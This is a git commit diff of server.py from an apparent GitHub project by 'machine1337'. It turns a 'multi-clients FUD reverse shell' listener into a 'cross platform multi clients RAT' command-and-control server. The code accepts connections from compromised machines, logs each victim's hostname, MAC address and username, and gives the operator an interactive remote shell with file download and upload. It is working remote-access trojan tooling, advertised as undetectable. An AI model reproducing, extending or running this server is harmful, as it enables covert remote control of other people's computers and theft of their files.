562769971461f04923b6ce2fefc325851fe6a6ad
clay <82051128+machine1337@users.noreply.github.com>
2023-08-03 15:29:44 -0700

    Update server.py

--- server.py
+++ server.py
@@ -1,149 +1,178 @@
-import os
-import platform
 import socket
 import json
+import threading
+import platform
+import os
 print("[*] Checking Requirements Module.....")
-if platform.system().startswith("Linux"):
-    try:
-        import termcolor
-    except ImportError:
-        os.system("python3 -m pip install termcolor -q -q -q")
-        import termcolor
+if platform.system().startswith("Windows"):
     try:
         from pystyle import *
-    except:
-        os.system("python3 -m pip install pystyle -q -q -q")
-        from pystyle import *
-    try:
-        import colorama
-        from colorama import Fore, Back, Style
     except ImportError:
-        os.system("python3 -m pip install colorama -q -q -q")
-        import colorama
-        from colorama import Fore, Back, Style
-
-elif platform.system().startswith("Windows"):
-    try:
-        import termcolor
-    except ImportError:
-        os.system("python -m pip install termcolor -q -q -q")
-        import termcolor
-    try:
-        import colorama
-        from colorama import Fore, Back, Style
-    except ImportError:
-        os.system("python -m pip install colorama -q -q -q")
-        import colorama
-        from colorama import Fore, Back, Style
-    try:
-        from pystyle import *
-    except:
         os.system("python -m pip install pystyle -q -q -q")
         from pystyle import *
-
-colorama.deinit()
+elif platform.system().startswith("Linux"):
+    try:
+        from pystyle import *
+    except ImportError:
+        os.system("python3 -m pip install pystyle -q -q -q")
+        from pystyle import *
 banner = Center.XCenter(r"""
-********************************************************************************
-*    ________   _______ _   _ ____       ____  _   _ _____ _     _   __        *
-*   / /  _ \ \ / /  ___| | | |  _ \     / ___|| | | | ____| |   | |  \ \       *
-*  | || |_) \ V /| |_  | | | | | | |____\___ \| |_| |  _| | |   | |   | |      *
-* < < |  __/ | | |  _| | |_| | |_| |_____|__) |  _  | |___| |___| |___ > >     *
-*  | ||_|    |_| |_|    \___/|____/     |____/|_| |_|_____|_____|_____| |      *
-*   \_\                                                              /_/       *
-*                       GENERATE MULTI-CLIENTS FUD REVERSE SHELL               *
-*                              Coded By: Machine1337                           *
-********************************************************************************                            
-                            \n\n
+***********************************************************************
+*     ________   _______ _   _ ____        ____      _  _______        *
+*    / /  _ \ \ / /  ___| | | |  _ \      |  _ \    / \|_   _\ \       *
+*   | || |_) \ V /| |_  | | | | | | |_____| |_) |  / _ \ | |  | |      *
+*  < < |  __/ | | |  _| | |_| | |_| |_____|  _ <  / ___ \| |   > >     *
+*   | ||_|    |_| |_|    \___/|____/      |_| \_\/_/   \_\_|  | |      *
+*    \_\                                                     /_/       *
+*                       CROSS PLATFORM MULTI CLIENTS RAT               *
+*                              Coded By: Machine1337                   *
+************************************************************************                        
 """)
 os.system("cls||clear")
 print(Colorate.Vertical(Colors.green_to_yellow, banner, 2))
-try:
-    sip = input(termcolor.colored('\n[*] Enter Your IP (for Listening):- ', 'green'))
-    sp = input(termcolor.colored('\n[*] Enter Your Port:- ', 'cyan'))
-    HOST = f'{sip}'
-    PORT = int(sp)
-    BUFFER_SIZE = 4096
-    clients = {}
-    client_id = 1
-    def send_data(client_conn, data):
-        json_data = json.dumps(data)
-        json_data_bytes = json_data.encode()
-        data_length = len(json_data_bytes).to_bytes(4, byteorder='big')
-        client_conn.sendall(data_length)
-        for i in range(0, len(json_data_bytes), BUFFER_SIZE):
-            chunk = json_data_bytes[i:i + BUFFER_SIZE]
-            client_conn.sendall(chunk)
-    def recv_data(client_conn):
-        data_length_bytes = client_conn.recv(4)
-        data_length = int.from_bytes(data_length_bytes, byteorder='big')
-        json_data_bytes = b""
-        bytes_received = 0
-        while bytes_received < data_length:
-            chunk = client_conn.recv(min(BUFFER_SIZE, data_length - bytes_received))
-            json_data_bytes += chunk
-            bytes_received += len(chunk)
-        json_data = json_data_bytes.decode()
-        data = json.loads(json_data)
-        return data
+ips = []
+client_usernames = {}
+targets = []
+connections = {}
+def recv_data(target):
+    data = ''
     while True:
         try:
-            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-                s.bind((HOST, PORT))
-                s.listen()
-                print(termcolor.colored(termcolor.colored('\n[*] Waiting for clients to connect...','yellow')))
-                conn, addr = s.accept()
-                clients[conn] = f'Client {client_id}'
-                print(termcolor.colored(f'\nConnected to {clients[conn]} - {addr}','cyan'))
-                client_id += 1
-                while True:
-                    command = input(Colorate.Vertical(Colors.green_to_yellow, "\n[*]Server Command (Type help):- ", 2))
-                    if command.lower() == 'help':
-                        print('''
-                        list  :   Show Connected Clients
-                        id    :   Enter Client ID To Connect
-                        back  :   Back From Client To Server
-                        ''')
-                    elif command.lower() == 'id':
-                        client_id_input = input(termcolor.colored("\n[*] Enter client ID: ",'cyan'))
-                        selected_client = None
-                        for client_conn, client_name in clients.items():
-                            if client_name == f'Client {client_id_input}':
-                                selected_client = client_conn
-                                break
-                        if selected_client is not None:
-                            while True:
-                                command = input(Colorate.Vertical(Colors.green_to_yellow, f"\nSHELL@{selected_client.getpeername()[0]} (Type help): ", 2))
-                                if command.lower() == 'back':
-                                    break
-                                elif command.lower() == 'help':
-                                    print('''
-                                    cd ..    :   Back From Current Directory
-                                    cd {foldername}    :  Change To Given Folder
-                                    back  :   Back From Client To Server
-                                                            ''')
-                                else:
-                                    send_data(selected_client, command)
-                                    data = recv_data(selected_client)
-                                    print(f'{clients[selected_client]}: {data}')
-                        else:
-                            print(termcolor.colored(f"\n[*] Client ID {client_id_input} not found.",'red'))
-                    elif command.lower() == 'list':
-                        print(termcolor.colored('\n[+] Connected Clients:- \n','cyan'))
-                        for client_conn, client_name in clients.items():
-                            print(f"{client_name}: {client_conn.getpeername()[0]}:{client_conn.getpeername()[1]}")
-                    else:
-                        for client_conn in clients.keys():
-                            send_data(client_conn, command)
-                            data = recv_data(client_conn)
-                            print(f'{clients[client_conn]}: {data}')
+            data = data + target.recv(1024).decode().rstrip()
+            return json.loads(data)
+        except ValueError:
+            continue
+def send_data(target, data):
+    jsondata = json.dumps(data)
+    target.send(jsondata.encode())
+def download_file(target, file_name):
+    f = open(file_name, 'wb')
+    target.settimeout(1)
+    chunk = target.recv(1024)
+    while chunk:
+        f.write(chunk)
+        try:
+            chunk = target.recv(1024)
+        except socket.timeout as e:
+            break
+    target.settimeout(None)
+    f.close()
+def upload_file(target, file_name):
+    f = open(file_name, 'rb')
+    target.send(f.read())
+#coded By Machine1337....If u like the tool...Follow me on github: @machine1337
+def shell(target, ip):
+    while True:
+        command = input(Colors.yellow+"\n[*] Shell@%s " % str(ip))
+        send_data(target, command)
+        if command == 'q':
+            break
+        if command == 'help':
+            print(Colorate.Vertical(Colors.red_to_purple, """
+             ****  SHELL COMMANDS MAIN MENU ****
+             
+    1. download filename  | Download File From Client
+    2. upload filename    | upload file To the Client
+    3. q                  | Back To The Server Main Menu 
+    4. kill               | Terminate the client shell
+                   More Features Will Be Added
+                   Follow:- github.com/machine1337
+                                """, 2))
+        elif command[:8] == "download":
+            download_file(target, command[9:])
+        elif command[:6] == 'upload':
+            upload_file(target, command[7:])
+        elif command == 'kill':
+            target.close()
+            targets.remove(target)
+            ips.remove(ip)
+            break
+        else:
+            message = recv_data(target)
+            print(message)
 
+def server():
+    global clients, connections
+    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    while True:
+        if stop_threads:
+            break
+        s.settimeout(1)
+        try:
+            target, ip = s.accept()
+            if ip[0] in connections:
+                target.close()
+            else:
+                info = recv_data(target)
+                hostname, mac_address, username = info.split(',')
+                client_data = {'HostName': hostname, 'MAC_Address': mac_address, 'Username': username}
+                client_usernames[ip[0]] = client_data
+                targets.append(target)
+                ips.append(ip)
+                connections[ip[0]] = target
+                print(Colors.green+"{} ({}:{}) has connected!".format(username, ip[0], ip[1])+"\n[*] Server Command (Type help):- ",end="")
+                clients += 1
+        except socket.timeout:
+            continue
         except KeyboardInterrupt:
             break
-        except Exception as e:
-            print(termcolor.colored('\n[*] An error occurred:', str(e),'red'))
-    for client_conn in clients.keys():
-        client_conn.close()
-except KeyboardInterrupt:
-    print(termcolor.colored('\n[*] Keyboard Interuption Occured!!!','red'))
-
-#coded by machine1337...Don't copy this code without giving me a star
+    print(Colors.red+"\n[*] Server shutting down...")
+    for target in targets:
+        target.close()
+    s.close()
+def listclients():
+    print("\n--------------------------------------------------------------------------------------")
+    print("SESSIONS  |  HOSTNAME         |  MAC ADDRESS           | USERNAME         | IP ADDRESS")
+    for count, ip in enumerate(ips):
+        if ip[0] in client_usernames:
+            target_info = client_usernames[ip[0]]
+            print("{:<10}|{:<12}       {:<15}           {:<11}       {}:{}".format(count, target_info['HostName'],
+                                                                                   target_info['MAC_Address'],
+                                                                                   target_info['Username'], ip[0],
+                                                                                   str(ip[1])))
+        else:
+            print(
+                "{:<10}|{:<12}         {:<15}           {:<11}       {}:{}".format(count, 'Unknown', 'None', 'Unknown',
+                                                                                   ip[0], str(ip[1])))
+        count += 1
+    print("---------------------------------------------------------------------------------------")
+def selectclient():
+    try:
+        num = int(command[8:])
+        tarnum = targets[num]
+        tarip = ips[num]
+        shell(tarnum, tarip)
+    except:
+        print(Colors.red+"\n[*] No session id under that number")
+if __name__ == '__main__':
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    s.bind(("127.0.0.1", 4444))  # change ur ip and port here
+    s.listen(5)
+    clients = 0
+    stop_threads = False
+    print(Colors.yellow+"\n[*] Server Listening On: ")
+    t1 = threading.Thread(target=server)
+    t1.start()
+    try:
+        while True:
+            command = input(Colorate.Vertical(Colors.green_to_yellow, "\n[*] Server Command (Type help):- ", 2))
+            if command == "targets":
+                listclients()
+            elif command == "help":
+                print(Colorate.Vertical(Colors.red_to_purple, """
+                ****  SERVER COMMANDS MAIN MENU ****
+    1. targets   ---> Display Connected Clients
+    2. session   ---> go to specific client shell like session 0
+    3. exit      ---> Terminate the server  
+            """, 2))
+            elif command[:7] == "session":
+                selectclient()
+            elif command == "exit":
+                stop_threads = True
+                t1.join()
+                break
+    except KeyboardInterrupt:
+        stop_threads = True
+        t1.join()
+#coded By Machine1337....If u like the tool...Follow me on github: @machine1337
